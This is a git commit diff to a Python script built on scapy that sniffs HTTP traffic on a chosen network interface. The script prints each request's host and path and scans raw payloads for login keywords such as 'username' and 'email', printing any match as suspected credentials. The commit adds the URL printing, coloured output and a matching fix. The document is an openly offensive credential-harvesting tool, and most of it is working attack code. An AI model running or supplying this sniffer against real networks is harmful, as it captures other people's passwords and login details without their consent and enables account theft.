198e44b23afe83b56afb08d68ff7369e15c3a912
ElegantSoft <react.laravel.dev@gmail.com>
2020-07-24 12:34:44 -0400

    some improvements

--- main.py
+++ main.py
@@ -4,14 +4,37 @@ import scapy.all as scapy
 from scapy.layers import http
 import optparse
 
+
 parser = optparse.OptionParser()
 
 parser.add_option("-i", "--interface", dest="interface", help="Enter interface to be sniffed")
 (options, args) = parser.parse_args()
 
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
 
 def process_sniffed_packet(packet: scapy.Packet):
     if packet.haslayer(http.HTTPRequest):
+        # detecting url
+        url_to_print = ""
+        if packet[http.HTTPRequest]:
+            url_to_print += str(packet[http.HTTPRequest].Host, 'utf-8')
+
+        if packet[http.HTTPRequest]:
+            url_to_print += str(packet[http.HTTPRequest].Path, 'utf-8')
+
+        print(url_to_print)
+        url_to_print = ""
+
+        # detecting passwords
         if packet.haslayer(scapy.Raw):
             load = packet[scapy.Raw].load
             login_keywords = ['user', 'username', 'uname', 'phone', 'mobile', 'email', 'mail'
@@ -19,8 +42,9 @@ def process_sniffed_packet(packet: scapy.Packet):
                               'remember']
 
             for word in login_keywords:
-                if word in load:
-                    print("[+] suspected auth credits: " + str(load))
+                if word in str(load):
+                    print(bcolors.OKGREEN +  "[+] suspected auth credits: " + str(load) + bcolors.ENDC)
+                    break
 
 
 def sniff(iface):
